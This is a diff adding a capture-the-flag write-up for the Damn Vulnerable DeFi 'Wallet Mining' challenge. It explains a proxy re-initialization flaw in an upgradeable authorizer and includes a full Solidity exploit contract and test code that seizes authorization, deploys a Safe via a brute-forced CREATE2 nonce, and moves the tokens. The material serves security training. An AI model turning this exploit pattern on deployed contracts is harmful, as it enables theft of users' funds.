@@ -1140,3 +1140,162 @@ Attack flow:
         Attacker attacker = new Attacker(vault, timelock, token, recovery);
         attacker.attack();
     }
+
+## 13. Wallet Mining
+
+### Challenge Overview  
+
+There’s a contract that incentivizes users to deploy Safe wallets, rewarding them with 1 DVT. It integrates with an upgradeable authorization mechanism, only allowing certain deployers (a.k.a. wards) to be paid for specific deployments.    
+The deployer contract only works with a Safe factory and copy set during deployment. It looks like the [Safe singleton factory](https://github.com/safe-global/safe-singleton-factory) is already deployed. 
+The team transferred 20 million DVT tokens to a user at `0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496`, where her plain 1-of-1 Safe was supposed to land. But they lost the nonce they should use for deployment. 
+To make matters worse, there's been rumours of a vulnerability in the system. The team's freaked out. Nobody knows what to do, let alone the user. She granted you access to her private key.   
+You must save all funds before it's too late!   
+Recover all tokens from the wallet deployer contract and send them to the corresponding ward. Also save and return all user's funds.    
+In a single transaction.    
+
+### Vulnerability Analysis
+
+The Wallet Mining challenge exposes a critical flaw in the upgrade mechanism of the AuthorizerUpgradeable contract. The vulnerability allows an attacker to re-initialize an already initialized proxy contract to bypass the authorization system.
+The core vulnerability lies in the init() function within the AuthorizerUpgradeable contract:   
+
+    contract AuthorizerUpgradeable {
+        uint256 public needsInit = 1;
+        mapping(address => mapping(address => uint256)) private wards;
+
+        constructor() {
+            needsInit = 0; // freeze implementation
+        }
+
+        function init(address[] memory _wards, address[] memory _aims) external {
+            require(needsInit != 0, "cannot init");
+            for (uint256 i = 0; i < _wards.length; i++) {
+                _rely(_wards[i], _aims[i]);
+            }
+            needsInit = 0;
+        }
+        
+        // ...
+    }   
+
+This implementation is vulnerable because of how proxy patterns work. When using a TransparentProxy, the constructor runs only on the implementation contract, not on the proxy. The needsInit = 0 in the constructor only affects the implementation, while the proxy's storage (which users interact with) remains uninitialized. While there is a check to prevent re-initialization (require(needsInit != 0)), this protection is ineffective because the AuthorizerFactory deploys a new implementation each time, allowing the attacker to call init() again and manipulate the authorization settings.   
+
+Attack flow:    
+
+1. Determine the correct nonce using CREATE2 address calculation to match the target address where 20M tokens are stored    
+2. Create initialization data for a 1-of-1 Safe wallet with the user as the owner   
+3. Pre-sign a transaction (using the user's private key) that will transfer all tokens to the user's EOA    
+4. Re-initialize the AuthorizerUpgradeable contract to authorize the attacker to deploy to the target address   
+5. Call the drop() function on WalletDeployer with the correct nonce to deploy the Safe wallet to the exact address holding the tokens  
+6. Execute the pre-signed transaction to recover all 20M tokens to the user's address   
+7. Transfer the 1 DVT reward from the WalletDeployer to the ward address    
+
+
+### Solution
+
+    contract Exploit {
+        constructor (
+            DamnValuableToken token,
+            AuthorizerUpgradeable authorizer,
+            WalletDeployer walletDeployer,
+            address safe,
+            address ward,
+            bytes memory initializer,
+            uint256 saltNonce,
+            bytes memory txData
+        ) {
+            address[] memory wards = new address[](1);
+            address[] memory aims = new address[](1);
+
+            wards[0] = address(this);
+            aims[0] = safe;
+
+            authorizer.init(wards, aims);
+            walletDeployer.drop(address(safe), initializer, saltNonce);
+            token.transfer(ward, token.balanceOf(address(this)));
+            safe.call(txData);
+        }
+    }
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_walletMining() public checkSolvedByPlayer {
+        // Step 1: Find the correct nonce and prepare data
+        (uint256 nonce, bytes memory initializer) = findCorrectNonce();
+        
+        // Step 2: Get the transaction data for execution
+        bytes memory execData = prepareExecTransactionData();
+        
+        // Step 3: Deploy the exploit contract
+        new Exploit(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, nonce, execData);
+    }
+
+    // Helper function to find the correct nonce
+    function findCorrectNonce() private returns (uint256 nonce, bytes memory initializer) {
+        address[] memory owner = new address[](1);
+        owner[0] = user;
+        initializer = abi.encodeCall(Safe.setup, (owner, 1, address(0), "",
+                                        address(0), address(0), 0, payable(0)));
+        
+        while(true) {
+            address target = vm.computeCreate2Address(
+                keccak256(abi.encodePacked(keccak256(initializer), nonce)),
+                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
+                address(proxyFactory)
+            );
+            if (target == USER_DEPOSIT_ADDRESS) {
+                break;
+            }
+            nonce++;
+        }
+        
+        return (nonce, initializer);
+    }
+
+    // Helper function to prepare the transaction data
+    function prepareExecTransactionData() private returns (bytes memory) {
+        bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
+        
+        // Calculate transaction hash
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH,
+                address(token),
+                0,
+                keccak256(data),
+                Enum.Operation.Call,
+                100000,
+                100000,
+                0,
+                address(0),
+                address(0),
+                0 // nonce of the Safe (first transaction)
+            )
+        );
+
+        bytes32 domainSeparator = keccak256(abi.encode(
+            0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH,
+            singletonCopy.getChainId(),
+            USER_DEPOSIT_ADDRESS
+        ));
+
+        // Sign the transaction
+        bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signatures = abi.encodePacked(r, s, v);
+        
+        // Create execution data
+        return abi.encodeWithSelector(
+            singletonCopy.execTransaction.selector, 
+            address(token), 
+            0, 
+            data, 
+            Enum.Operation.Call, 
+            100000, 
+            100000, 
+            0, 
+            address(0), 
+            address(0), 
+            signatures
+        );
+    }
